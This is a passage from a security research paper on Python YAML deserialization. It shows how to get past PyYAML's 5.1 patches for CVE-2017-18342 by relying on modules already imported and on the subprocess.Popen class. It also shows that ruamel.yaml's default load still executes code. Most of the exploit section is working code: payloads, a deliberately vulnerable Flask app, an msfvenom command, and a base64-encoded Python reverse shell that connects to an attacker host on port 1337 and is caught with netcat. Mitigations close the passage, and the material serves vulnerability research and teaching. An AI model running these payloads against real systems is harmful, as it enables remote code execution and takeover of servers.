load(data, Loader=UnsafeLoader) [Exists in
version > 5.1]

load(data, Loader=UnsafeLoader)

load(data, Loader=FullLoader) [Exists in version
> 5.1]

load(data, Loader=FullLoader)

load_all(data) [works for version < 5.1]

load_all(data)

load_all(data, Loader=Loader)

load_all(data, Loader=Loader)

load_all(data, Loader=UnSafeLoader) [Exists in
version >= 5.1]

load_all(data, Loader=UnSafeLoader)

load_all(data, Loader=FullLoader)

load_all(data, Loader=FullLoader) [Exists in
version >= 5.1]

full_load(data) [Exists in version >= 5.1]

full_load_all(data) [Exists in version >= 5.1]

unsafe_load(data) [Exists in version >= 5.1]

unsafe_load_all(data) [Exists in version >= 5.1]

safe_load() or safe_load_all() uses SafeLoader and don’t support class object deserialization .

Class object deserialization example:

Code:

import yaml
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

25

Output;

range(1, 10)
C:/Users/j0lt/paper_files/main.py:4: YAMLLoadWarning: calling yaml.load()
without Loader=... is deprecated, as the default Loader is unsafe. Please
read https://msg.pyyaml.org/load for full details.
  deserialized_data = yaml.load(data)  # deserializing data

The output returned is range(1,10) which is an iterator object.

Let us deserialize a serialized python built-in module method object, with default load() in version
5.1.2

import yaml
data = b'!!python/object/apply:time.sleep [10]'

deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

Output:

C:/Users/j0lt/paper_files/main.py:4: YAMLLoadWarning: calling yaml.load() without
Loader=... is deprecated, as the default Loader is unsafe. Please read
https://msg.pyyaml.org/load for full details.
  deserialized_data = yaml.load(data)  # serializing data
Traceback (most recent call last):
  File "C:/Users/j0lt/paper_files/main.py", line 4, in <module>
    deserialized_data = yaml.load(data)  # serializing data
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\__init__.py", line 114, in load
    return loader.get_single_data()
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 43, in
get_single_data
    return self.construct_document(node)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 94, in
construct_object
    data = constructor(self, tag_suffix, node)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 624, in
construct_python_object_apply
    instance = self.make_python_instance(suffix, node, args, kwds, newobj)
  File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 570, in
make_python_instance
    node.start_mark)
yaml.constructor.ConstructorError: while constructing a Python instance
expected a class, but found <class 'builtin_function_or_method'>
  in "<byte string>", line 1, column 1:
    !!python/object/apply:time.sleep ...
    ^

26

It failed, because in version >= 5.1, it doesn’t allow to deserialize any serialized python class or class
attribute, with Loader not specified in load() or Loader=SafeLoader. Only class type objects are
allowed to deserialize which are present in the script or imported in the script.

The question arises, why it is happening in these conditions. For that, the changes made to
constructor.py of PyYAML are responsible. There are two patches in version >=5.1 that restrict
deserialization of built-in class methods and use of those classes which are not imported or present in
the deserialization code.

Code of constructor.py of PyYAML version >=5.1:

Patch 1:

27

Patch 2:

The code can stop its execution because of any of the above highlighted conditions to be True.

In Patch 1, sys.modules list down all the modules getting used in the code. Let us check if the “time”
module is in code or not?

import yaml
import sys

print(sys.modules['time'])

output:

<module 'time' (built-in)>

The output shows that the “time” module is present in the code. The question arises, how? It is
because YAML modules have some classes like constructor.py etc. which uses datetime module and it
is very clear from datetime module that datetime uses “time” module.

28

Code of datetime module:

Since, “time” module is a part of the code, sys.modules lists “time”, this condition becomes False and
code moves forward.

It is evidentiary, the maintainer of this module wanted to allow deserialization of used classes or
modules in the deserializing code only. Hence, it is not a proper patch.

Other cases in which it will make this highlighted condition to be false and deserialize data are:

29

1. That class or module is explicitly imported in the deserializing code.

Example:

import yaml
import time
data = b'!!python/object/apply:time.sleep [10]'

deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

2. Any module is imported in deserializing code which is using that specified class/module in its code.
For Example, PyYAML's constructor.py  is having datetime imported and datetime have time
imported so time is present in sys .modules.

Example:

import yaml

data = b'!!python/object/apply:time.sleep [10]'

deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

3. Deserializing code have a custom class and required class methods as its class method.

import yaml
class time:
   def sleep(self, t):
      print("Sleeping "+t+" seconds")
data = b'!!python/object/apply:time.sleep [10]'

deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

This will not give 10-second delay but prints “Sleeping 10 seconds” in console.

For all the above conditions, the first patch can be bypassed and code jumps to the next steps.

Secondly, the code will check if “sleep” is an attribute of module “time” using hasattr().

30

If the object_name is the attribute of the module then it will make condition false and code will jump
to return statement on line 544. Now, getattr(module, object_name) try to create an object of
attribute object_name of module and represent it like below,

Code:

import yaml
import sys

print(getattr(sys.modules['time'], 'sleep'))

Output:

<built-in function sleep>

The output shows that the type of attribute “sleep” in the “time” module. It clearly shows that
“sleep” exist as an individual function in the time module and not as a class or class method.

Coming to Patch 2, it will check, what type of attribute the deserialized data is calling in the specified
module or class using isinstance(cls, type). If it is not of type class then it will make condition true and
stops execution with an error, like in case of “time.sleep”. “sleep” gives “built-in function” type and
not the class type which takes this condition as false.

31

Code:

import yaml
import sys

cls = getattr(sys.modules['time'], 'sleep')
print(isinstance(cls, type))

Output:

False

We can bypass it by deserializing objects of classes only and not class methods or any other type of
attributes of module. In short, we needed “sleep” to be a class instead of a function to make it
executed.

Trying same code in Pyyaml version < 5.1, load(data, Loader=Loader), load(data, Loader=FullLoader)
or load(data, Loader=UnsafeLoader), we will get output with delay of 10 seconds which completely
show that “time.sleep(10)” will get executed. The “None” is the return value of “time.sleep(10)” after
execution .

Output;

None

For the PyYAML version < 5.1, the constructor.py don’t have these patches and works fine.

In ruamel.yaml, deserialization of class objects can take place like this,

import ruamel.yaml as yaml
data = b'!!python/object/apply:time.sleep [10]'

deserialized_data = yaml.load(data)  # serializing data

print(deserialized_data)

32

Output;

C:/Users/j0lt/paper_files/main.py:4: UnsafeLoaderWarning:
The default 'Loader' for 'load(stream)' without further arguments can be
unsafe.
Use 'load(stream, Loader=ruamel.yaml.Loader)' explicitly if that is OK.
Alternatively include the following in your code:

  import warnings
  warnings.simplefilter('ignore', ruamel.yaml.error.UnsafeLoaderWarning)

In most other cases you should consider using 'safe_load(stream)'
  deserialized_data = yaml.load(data)  # serializing data
None

It will show a warning message before deserializing data. “None” will be printed on screen after 10
seconds delay which completely shows that “time.sleep(10)” will get executed when it gets converted
to object again with deserialization.

33

EXPLOITING YAML DESERIALIZATION

It is clear that Python YAML modules can serialize objects of python inbuild classes and their
attributes , and when it deserializes them, it recreates those objects, which can sometimes lead to
their execution, depending if those objects tend to execute and return something. This means we can
also serialize objects of those class methods which can basically execute OS commands. Modules like
os, subprocess etc. are very good to go as they have methods which can execute OS commands.

Let’s first create our payload, like we normally serialize objects of class methods using __reduce__().

Kindly note payload creation can be done with any python YAML module (PyYAML or ruamel.yaml), in
the same way. The same payload can exploit both YAML module or any module based on PyYAML or
ruamel.yaml.

Our target is to run OS commands when our payload gets deserialized. In Linux, ls is a terminal
command used to list items in the present directory.

Code:

import yaml
import subprocess

class Payload(object):
    def __reduce__(self):
        return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload())  # serializing data

print(deserialized_data)

Output:

!!python/object/apply:subprocess.Popen
- ls

One can use a tool created by me to create payloads for YAML in python available on
Github(https://github.com/j0lt-github/python-deserialization-attack-payload-generator). It is an
advanced payload generator. One can create payloads for complex commands using this tool in
seconds. It also supports other payload generation for deserialization attack on pickle and jsonpickle.

Now let's write a code which can deserialize this.

34

Exploiting YAML in PyYAML version < 5.1

To deserialize above result i.e. serialized class method with arguments, in PyYAML version < 5.1, we
have below methods,

Methods in PyYAML < 5.1

load(data)

load(data, Loader=Loader)

load_all(data)

load_all(data, Loader=Loader)

So, any of the above methods can be used. Even we can directly call load() by supplying data to
deserialize and it will deserialize it perfectly and our class Popen will be executed.

Example Code:

import yaml

data = b"""!!python/object/apply:subprocess.Popen
- ls"""
deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

Output:

test.py
abc.txt
test.txt

The output will show the list of content in the present working directory.

This causes RCE and in 2017 a researcher reported it and a CVE was released, CVE-2017-18342. But
that time it was tested on version < 5.1 and patches were released afterwards in versions >=5.1

35

Exploiting YAML in PyYAML version >= 5.1

To deserialize above result i.e. serialized class method with arguments, in PyYAML version >= 5.1, we
have below methods,

Methods in PyYAML

load(data) [works under certain conditions]

load(data, Loader=Loader)

load(data, Loader=UnsafeLoader)

load(data, Loader=FullLoader)

load_all(data) [works under certain condition]

load_all(data, Loader=Loader)

load_all(data, Loader=UnSafeLoader)

load_all(data, Loader=FullLoader)

full_load(data)

full_load_all(data)

unsafe_load(data)

unsafe_load_all(data)

Any method mentioned above can be used to deserialize custom class objects, except load() and
load_all() with default “Loader” as maintainer for PyYAMLl have applied some changes to stop this
type of vulnerability but. But there is a certain condition which let us bypass this patch discussed
earlier. Let’s first try to deserialize data with other methods,

Example 1 code:

from yaml import *

data = b"""!!python/object/apply:subprocess.Popen
- ls"""
deserialized_data = load(data, Loader=Loader)  # deserializing data

print(deserialized_data)

36

Output:

<subprocess.Popen object at 0x7fc2a7ec9fff>
test.py
abc.txt
test.txt

Example 2:

Code:

from yaml import *

data = b"""!!python/object/apply:subprocess.Popen
- ls"""
deserialized_data = unsafe_load(data, Loader=Loader)  # deserializing data

print(deserialized_data)

Output:

<subprocess.Popen object at 0x7fc2a7ec813a>
test.py
abc.txt
test.txt

Like these, other mentioned methods will work similarly except load() with default values.

Code with default load() values:

import yaml

data = b"""!!python/object/apply:subprocess.Popen
- ls"""
deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

37

Output:

test.py:4: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the
default Loader is unsafe. Please read https://msg.pyyaml.org/load for full details.
  yaml.load(data)
Traceback (most recent call last):
  File "test.py", line 4, in <module>
    yaml.load(data)
  File "/usr/lib/python2.7/dist-packages/yaml/__init__.py", line 114, in load
    return loader.get_single_data()
  File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 45, in get_single_data
    return self.construct_document(node)
  File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 49, in
construct_document
    data = self.construct_object(node)
  File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 96, in
construct_object
    instance = self.make_python_instance(suffix, node, args, kwds, newobj)
  File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 554, in
make_python_instance
    cls = self.find_python_name(suffix, node.start_mark)
  File "/usr/lib/python2.7/dist-packages/yaml/constructor.py", line 522, in
find_python_name
    "module %r is not imported" % module_name.encode('utf-8'), mark)
yaml.constructor.ConstructorError: while constructing a Python object
module 'subprocess' is not imported
  in "<string>", line 1, column 1:
    !!python/object/apply:subprocess ...
    ^

It can be seen clearly from the error that the code stop executing at Patch 1, because sys.modules
don’t have subprocess.

Code:

import yaml
import sys
print(sys.modules['subprocess'])

Output:

Traceback (most recent call last):
  File "/home/j0lt/main.py", line 3, in <module>
    print(sys.modules['subprocess'])
KeyError: 'subprocess'

For make it running we have to just import subprocess in the code or import any module which has
subprocess imported. For example, lets import “flask” in the code and execute it.

38

Code:

import yaml
import flask # importing flask

data = b"""!!python/object/apply:subprocess.Popen
- ls"""
deserialized_data = yaml.load(data)  # deserializing data

print(deserialized_data)

Output:

test.py:5: YAMLLoadWarning: calling yaml.load() without Loader=... is
deprecated, as the default Loader is unsafe. Please read
https://msg.pyyaml.org/load for full details.
  a = yaml.load(data)
<subprocess.Popen object at 0x7fc2a7ec9e10>
abc.txt  test.py

The command gets executed with a warning message. But it runs because of Flask imports some
classes or modules which use subprocess.

The question arises here is, if PyYAML doesn’t use subprocess then why not we use serialized object
of os.system to run our command? os.system will run and execute commands in PyYAML version <
5.1 but in version >=5.1 it will not work because of patch 2, as system is not a class in the os module.
In case of Popen, Popen is a class in subprocess module and it bypasses patch 2. So this condition is a
bypass to patches applied for CVE-2017-18342.

Let consider a web application running on the flask and which is using yaml.load() object to
deserialize user-supplied input. Used python environment is python2.x.

39

Code:

from flask import Flask, request
import yaml
from base64 import b64decode
app = Flask(__name__)

@app.route("/", methods=["GET","POST"])
def index():
   if request.method == "GET":
      return '''<!DOCTYPE html><html><body><h2>YAML Deserialization</h2><form action="/"
method="post">Data in Base64<br><input type="text" name="data" value=""><br><br><input
type="submit" value="Submit"></form><p>Enter base64 data to be
deserialize</p></body></html>'''
   else:
      data = yaml.load(b64decode(request.form.get("data")))
      return '''<!DOCTYPE html><html><body><h2>YAML Deserialization</h2><form action="/"
method="post">Data in Base64<br><input type="text" name="data" value=""><br><br><input
type="submit" value="Submit"></form><p>Enter base64 data to be
deserialize</p><p>Deserialized data is :'''+data+'''</p></body></html>'''

if __name__ == '__main__':
   app.run("0.0.0.0", port=8080)

The application is running at port 8080.

In browser it will show page at http://<ip>:8080/

40

Now let's try a payload to get a reverse shell through RCE at port 1337 of attacker machine.
We will use msfvenom and basic yaml syntax for generating a payload for a reverse shell.

First, we need to use generate a python payload which can give us a reverse shell when executed. For
that use msfvenom,

msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your port> -f raw

It will give output like,

"exec('aW1wb3J0IHNvY2tldCAgICAsICBzdWJwcm9jZXNzICAgICwgIG9zICAgICAgIDsgICAgICAgICBob3N0PSI
xOTIuMTY4LjAuMTEiICAgICAgIDsgICAgICAgICBwb3J0PTEzMzcgICAgICAgOyAgICAgICAgIHM9c29ja2V0LnNvY
2tldChzb2NrZXQuQUZfSU5FVCAgICAsICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgICAgICBzLmNvbm5
lY3QoKGhvc3QgICAgLCAgcG9ydCkpICAgICAgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgMCkgI
CAgICAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAsICAxKSAgICAgICA7ICAgICAgICAgb3MuZHVwMih
zLmZpbGVubygpICAgICwgIDIpICAgICAgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='
.decode('base64'))"

So, our payload will look like this:

!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python
  - -c
  - "exec('aW1wb3J0IHNvY2tldCAgICAsICBzdWJwcm9jZXNzICAgICwgIG9zICAgICAgIDsgICAgICAgICBob3N
0PSIxOTIuMTY4LjAuMTEiICAgICAgIDsgICAgICAgICBwb3J0PTEzMzcgICAgICAgOyAgICAgICAgIHM9c29ja2V0L
nNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAsICBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgIDsgICAgICAgICBzLmN
vbm5lY3QoKGhvc3QgICAgLCAgcG9ydCkpICAgICAgIDsgICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgM
CkgICAgICAgOyAgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAsICAxKSAgICAgICA7ICAgICAgICAgb3MuZHV
wMihzLmZpbGVubygpICAgICwgIDIpICAgICAgIDsgICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoI
ik='.decode('base64'))"

Kindly note that, we are not using dump() for generating this payload because of use of single and
double quotes in our payload . Either we can make it manually like this or one can use peas available
on Github(https://github.com/j0lt-github/python-deserialization-attack-payload-generator).

Now, this payload in base64 is,

ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3MuUG9wZW4KLSAhIXB5dGhvbi90dXBsZQogIC0gcHl0aG9uCi
AgLSAtYwogIC0gImV4ZWMoJ2FXMXdiM0owSUhOdlkydGxkQ0FnSUNBc0lDQnpkV0p3Y205alpYTnpJQ0FnSUN3Z0lH
OXpJQ0FnSUNBZ0lEc2dJQ0FnSUNBZ0lDQm9iM04wUFNJeE9USXVNVFk0TGpBdU1URWlJQ0FnSUNBZ0lEc2dJQ0FnSU
NBZ0lDQndiM0owUFRFek16Y2dJQ0FnSUNBZ095QWdJQ0FnSUNBZ0lITTljMjlqYTJWMExuTnZZMnRsZENoemIyTnJa
WFF1UVVaZlNVNUZWQ0FnSUNBc0lDQnpiMk5yWlhRdVUwOURTMTlUVkZKRlFVMHBJQ0FnSUNBZ0lEc2dJQ0FnSUNBZ0
lDQnpMbU52Ym01bFkzUW9LR2h2YzNRZ0lDQWdMQ0FnY0c5eWRDa3BJQ0FnSUNBZ0lEc2dJQ0FnSUNBZ0lDQnZjeTVr
ZFhBeUtITXVabWxzWlc1dktDa2dJQ0FnTENBZ01Da2dJQ0FnSUNBZ095QWdJQ0FnSUNBZ0lHOXpMbVIxY0RJb2N5NW
1hV3hsYm04b0tTQWdJQ0FzSUNBeEtTQWdJQ0FnSUNBN0lDQWdJQ0FnSUNBZ2IzTXVaSFZ3TWloekxtWnBiR1Z1Ynln
cElDQWdJQ3dnSURJcElDQWdJQ0FnSURzZ0lDQWdJQ0FnSUNCd1BYTjFZbkJ5YjJObGMzTXVZMkZzYkNnaUwySnBiaT
lpWVhOb0lpaz0nLmRlY29kZSgnYmFzZTY0JykpIg==

41

Open port for incoming shell connection using netcat.

Now try to submit this payload.

It will show an “Internal Server Error” on the browser.

42

But we will get a reverse connection in netcat.

Exploiting YAML in ruamel.yaml

To deserialize the serialized class method with arguments, in ruamel.yaml , we have below methods,

Methods in ruamel.yaml

load(data)

load(data, Loader=Loader)

load(data, Loader=UnsafeLoader)

load(data, Loader=FullLoader)

load_all(data)

load_all(data, Loader=Loader)

load_all(data, Loader=UnSafeLoader)

load_all(data, Loader=FullLoader)

43

So, any of the above methods can be used. Even we can directly call load() by supplying data to
deserialize and it will deserialize it perfectly and our class method will be executed.

Code:

import ruamel.yaml

data = b"""!!python/object/apply:subprocess.Popen
- ls"""
deserialized_data = ruamel.yaml.load(data)  # serializing data

print(deserialized_data)

Output:

/home/j0lt/paper_files/main.py:4: UnsafeLoaderWarning:
The default 'Loader' for 'load(stream)' without further arguments can be
unsafe.
Use 'load(stream, Loader=ruamel.yaml.Loader)' explicitly if that is OK.
Alternatively include the following in your code:

  import warnings
  warnings.simplefilter('ignore', ruamel.yaml.error.UnsafeLoaderWarning)

In most other cases you should consider using 'safe_load(stream)'
  deserialized_data = ruamel.yaml.load(data)  # serializing data
<subprocess.Popen object at 0x7fc2a7ec9ef0>
abc.txt  test.py

It will execute our command with a warning message. This shows till today, ruamel.yaml is vulnerable
to RCE if it processes the user-supplied payload.

44

MITIGATIONS

The proper mitigation to avoid RCE during the processing of YAML data is to use these functions to
deserialize data,

Methods in PyYAML

Methods in ruamel.yaml

safe_load()

safe_load_all()

safe_load()

safe_load_all()

load(‘data’, Loader=SafeLoader)

load(‘data’, Loader=SafeLoader)

And to serialize data, one can use below safe functions,

Methods in PyYAML

Methods in ruamel.yaml

safe_dump()

safe_dump_all()

safe_dump()

safe_dump_all()

dump(‘data’, Dumper=SafeDumper)

dump(‘data’, Dumper=SafeDumper)

45

REFERENCES

1. https://yaml.readthedocs.io/en/latest/pyyaml.html

2. https://stackoverflow.com/questions/19855156/whats-the-exact-usage-of-reduce-in-pickler

3. https://www.cvedetails.com/cve/CVE-2017-18342/

4. https://github.com/yaml/pyyaml

5. https://bitbucket.org/ruamel/yaml

6. https://github.com/yaml/pyyaml/issues/207

7. https://yaml.org/

8. https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation

9. https://github.com/yaml/pyyaml/issues/265

46


